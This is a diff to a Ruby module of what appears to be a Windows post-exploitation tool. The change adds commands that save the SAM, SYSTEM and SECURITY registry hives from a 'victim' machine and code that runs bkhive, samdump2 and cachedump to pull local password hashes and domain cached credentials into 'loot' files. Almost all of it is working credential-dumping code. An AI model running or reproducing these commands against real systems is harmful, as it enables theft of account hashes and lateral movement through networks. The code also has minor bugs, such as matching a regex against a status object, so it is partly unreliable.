@@ -49,11 +49,17 @@ module MainCommands
   def hex_to_bin_file
     'hex_to_bin.txt'
   end
+  def reg_folder
+    'c:\\windows\\temp\\reg\\'
+  end
   def save_sam
-    'reg.exe save HKLM\SAM c:\windows\temp\sam'
+    "reg.exe save HKLM\\SAM #{reg_folder}sam"
   end
   def save_sys
-    'reg.exe save HKLM\SYSTEM c:\windows\temp\sys'
+    "reg.exe save HKLM\\SYSTEM #{reg_folder}sys"
+  end
+  def save_sec
+    "reg.exe save HKLM\\SECURITY #{reg_folder}sec"
   end
   def victim_path
     'c:\\windows\\temp\\'
@@ -62,13 +68,12 @@ module MainCommands
     'c:\\windows\\temp\\test.txt'
   end
   def print_hashes(x)
-    #cache_path, cache_status = Open3.capture2('which cachedump')
+    cache_path, cache_status = Open3.capture2('which cachedump')
     samdump_path, samdump_status = Open3.capture2('which samdump2')
     bkhive_path, bkhive_status = Open3.capture2('which bkhive')
-    #print_error("Can't find cachedump!\n") if cache_status.to_s =~ /1/
+    print_error("Can't find cachedump!\n") if cache_status.to_s =~ /1/
     print_error("Can't find samdump2!\n") if samdump_status.to_s =~ /1/
     print_error("Can't find bkhive!\n") if bkhive_status.to_s =~ /1/
-    #if cache_status.to_s =~ /0/ and samdump_status.to_s =~ /0/ and bkhive_status.to_s =~ /0/
     if samdump_status.to_s =~ /0/ and bkhive_status.to_s =~ /0/
       Open3.capture2("#{bkhive_path} #{loot_dir}sys#{x} #{loot_dir}sys_key.txt")
       sam_dump = Open3.capture2("#{samdump_path} #{loot_dir}sam#{x} #{loot_dir}sys_key.txt")
@@ -76,7 +81,15 @@ module MainCommands
       puts sam_dump
       File.open("#{loot_dir}hashes#{x}.txt",'w') {|f| f.write(sam_dump)}
     else
-      print_error("Can't dump hashes!\n")
+      print_error("Can't dump local hashes!\n")
+    end
+    if cache_status =~ /0/
+      cache_domain = Open3.capture2("#{cache_path} #{loot_dir}sys#{x} #{loot_dir}sec#{x}")
+      print_success("Printing Domain Chached Creds!\n")
+      puts cache_domain
+      File.open("#{loot_dir}domain_hashes#{x}.txt",'w') {|f| f.write(cache_domain)}
+    else
+      print_error("Can't Dump Domain Cached Creds!\n")
     end
   end
   def encode_command(command)
